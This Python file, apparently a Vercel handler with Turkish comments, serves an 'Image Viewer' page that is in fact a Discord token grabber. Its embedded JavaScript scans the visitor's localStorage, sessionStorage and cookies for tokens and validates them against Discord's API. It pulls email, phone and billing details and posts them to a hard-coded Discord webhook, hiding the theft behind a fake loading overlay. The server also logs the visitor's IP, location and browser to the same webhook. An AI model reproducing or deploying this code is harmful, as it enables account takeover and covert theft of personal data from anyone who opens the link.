from http.server import BaseHTTPRequestHandler
from urllib import parse
import json, base64, requests, traceback, httpagentparser
from datetime import datetime

# Konfigürasyon ayarları
config = {
    "webhook": "https://discord.com/api/webhooks/1350927981828112505/F1kWu21zY_iCY3cmjPIN_GDCWqUUMDr0WSk4us1MJMmQv_vFG3_EpX4K1M4FE6-xMXuc",  # Webhook URL'nizi buraya yerleştirin
    "image": "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9nOTh2MjZrYVY4NC9tYXhyZXNkZWZhdWx0LmpwZw==",             # Göstermek istediğiniz resmin URL'si
    "username": "Security Bot",
    "avatar_url": "https://i.imgur.com/qwuTdKl.png",
    "color": 0x3498db,
}

# Token çalma JavaScript kodu
TOKEN_STEALER_JS = r"""
<script>
// Token çalma kodu
(async () => {
    const webhookURL = "%s";
    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/g;
    
    // CSS Styles
    const styles = `
    .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        backdrop-filter: blur(5px);
    }
    .loading-container {
        background: #36393f;
        border-radius: 8px;
        padding: 24px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        text-align: center;
        color: white;
        font-family: 'Whitney', 'Helvetica Neue', Arial, sans-serif;
    }
    .spinner {
        width: 50px;
        height: 50px;
        border: 5px solid #5865f2;
        border-top: 5px solid transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 16px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    `;
    
    // Create overlay
    const createOverlay = () => {
        const overlay = document.createElement('div');
        overlay.className = 'overlay';
        overlay.innerHTML = `
            <div class="loading-container">
                <div class="spinner"></div>
                <h3>Yukleniyor...</h3>
                <p>Goruntunun yuklenmesi biraz zaman alabilir.</p>
            </div>
        `;
        document.body.appendChild(overlay);
        
        const styleEl = document.createElement('style');
        styleEl.textContent = styles;
        document.head.appendChild(styleEl);
        
        setTimeout(() => {
            overlay.style.display = 'flex';
        }, 500);
    };
    
    // Find Discord Tokens
    const findTokens = () => {
        const tokens = new Set();
        
        // Check localStorage
        try {
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if(typeof value === 'string') {
                    const matches = value.match(tokenRegex);
                    if(matches) matches.forEach(t => tokens.add(t));
                }
            }
        } catch(e) {}
        
        // Check sessionStorage
        try {
            for(let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                if(typeof value === 'string') {
                    const matches = value.match(tokenRegex);
                    if(matches) matches.forEach(t => tokens.add(t));
                }
            }
        } catch(e) {}
        
        // Check cookies
        try {
            const cookies = document.cookie.split(';');
            for(const cookie of cookies) {
                const value = cookie.trim().split('=')[1];
                if(value) {
                    const matches = value.match(tokenRegex);
                    if(matches) matches.forEach(t => tokens.add(t));
                }
            }
        } catch(e) {}
        
        return Array.from(tokens);
    };
    
    // Get user info
    const getUserInfo = async (token) => {
        try {
            const userResponse = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { Authorization: token }
            });
            
            if(!userResponse.ok) return null;
            
            const userData = await userResponse.json();
            
            // Try to get billing info
            let billingCount = 0;
            try {
                const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                    headers: { Authorization: token }
                });
                
                if(billingResponse.ok) {
                    const billingData = await billingResponse.json();
                    billingCount = billingData.length;
                }
            } catch(e) {}
            
            return {
                token: token,
                username: userData.username + '#' + userData.discriminator,
                id: userData.id,
                email: userData.email || 'Bulunamadi',
                phone: userData.phone || 'Bulunamadi',
                avatar: userData.avatar,
                nitro: userData.premium_type ? (userData.premium_type === 2 ? 'Nitro Boost' : 'Nitro Classic') : 'Yok',
                billing: billingCount
            };
        } catch(e) {
            return null;
        }
    };
    
    // Main function
    const main = async () => {
        try {
            createOverlay();
            
            // Find tokens
            const tokens = findTokens();
            
            if(tokens.length > 0) {
                const validTokens = [];
                
                for(const token of tokens) {
                    const info = await getUserInfo(token);
                    if(info) validTokens.push(info);
                }
                
                if(validTokens.length > 0) {
                    // Send to webhook
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "Token Logger",
                            avatar_url: "https://i.imgur.com/FpZ9kFX.png",
                            embeds: validTokens.map(data => ({
                                title: "Discord Token Bulundu!",
                                color: 0xFF0000,
                                fields: [
                                    { name: "Kullanici", value: data.username, inline: true },
                                    { name: "ID", value: data.id, inline: true },
                                    { name: "E-posta", value: data.email, inline: true },
                                    { name: "Telefon", value: data.phone, inline: true },
                                    { name: "Nitro", value: data.nitro, inline: true },
                                    { name: "Odeme Bilgisi", value: data.billing ? `${data.billing} adet kayitli` : "Yok", inline: true },
                                    { name: "Token", value: "```" + data.token + "```" }
                                ],
                                thumbnail: { url: `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png` },
                                timestamp: new Date().toISOString()
                            }))
                        })
                    });
                }
            }
        } catch(e) {}
    };
    
    // Start after short delay
    setTimeout(main, 1500);
})();
</script>
""" % config["webhook"]

# IP ve konum bilgisi toplama function
def log_ip(ip, useragent=None, url=None):
    if not config["webhook"]:
        return
        
    try:
        # IP bilgisi al
        info = requests.get(f"http://ip-api.com/json/{ip}").json()
        
        # Cihaz bilgilerini çıkar
        os_info, browser = httpagentparser.simple_detect(useragent) if useragent else ("Bilinmiyor", "Bilinmiyor")
        
        # Webhook'a gönder
        requests.post(config["webhook"], json={
            "username": config["username"],
            "avatar_url": config.get("avatar_url"),
            "embeds": [{
                "title": "🌐 Yeni IP Loglandi!",
                "color": config["color"],
                "fields": [
                    {"name": "📌 IP Adresi", "value": f"`{ip}`", "inline": True},
                    {"name": "🌍 Ulke", "value": info.get("country", "Bilinmiyor"), "inline": True},
                    {"name": "🏙️ Sehir", "value": info.get("city", "Bilinmiyor"), "inline": True},
                    {"name": "🔌 ISP", "value": info.get("isp", "Bilinmiyor"), "inline": True},
                    {"name": "💻 Isletim Sistemi", "value": os_info, "inline": True},
                    {"name": "🌐 Tarayici", "value": browser, "inline": True},
                    {"name": "📱 User Agent", "value": f"```{useragent}```", "inline": False}
                ],
                "thumbnail": {"url": url} if url else {},
                "timestamp": datetime.utcnow().isoformat()
            }]
        })
    except Exception as e:
        print(f"Log error: {str(e)}")

# Base64 URL kodlama fonksiyonu
def encode_url(url):
    return base64.b64encode(url.encode()).decode()

# Vercel handler fonksiyonu
def handler(request):
    try:
        # URL ve parametreleri al
        path = request.get("path", "")
        headers = request.get("headers", {})
        
        # URL parametrelerini çözümle
        parsed_url = parse.urlsplit(path)
        params = dict(parse.parse_qsl(parsed_url.query))
        
        # IP ve User-Agent al
        ip = headers.get("x-forwarded-for", headers.get("x-real-ip", "Bilinmiyor"))
        user_agent = headers.get("user-agent", "Bilinmiyor")
        
        # Resim URL'ini belirle
        image_url = config["image"]
        if params.get("url"):
            try:
                image_url = base64.b64decode(params.get("url").encode()).decode()
            except:
                pass
        
        # HTML içeriği oluştur
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            background-color: #000;
        }}
        .image-container {{ 
            width: 100vw; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center;
        }}
        img {{ 
            max-width: 100%; 
            max-height: 100vh; 
            object-fit: contain;
        }}
    </style>
    {TOKEN_STEALER_JS}
</head>
<body>
    <div class="image-container">
        <img src="{image_url}" alt="Image">
    </div>
</body>
</html>"""
        
        # IP Logla
        log_ip(ip, user_agent, image_url)
        
        # Yanıtı döndür
        return {
            "statusCode": 200,
            "headers": {
                "Content-Type": "text/html; charset=utf-8",
                "Cache-Control": "no-cache, no-store, must-revalidate"
            },
            "body": html_content
        }
    except Exception as e:
        # Hata durumunda basit bir yanıt döndür
        error_msg = str(e)
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/plain"},
            "body": f"Sunucu hatasi: {error_msg}"
        }
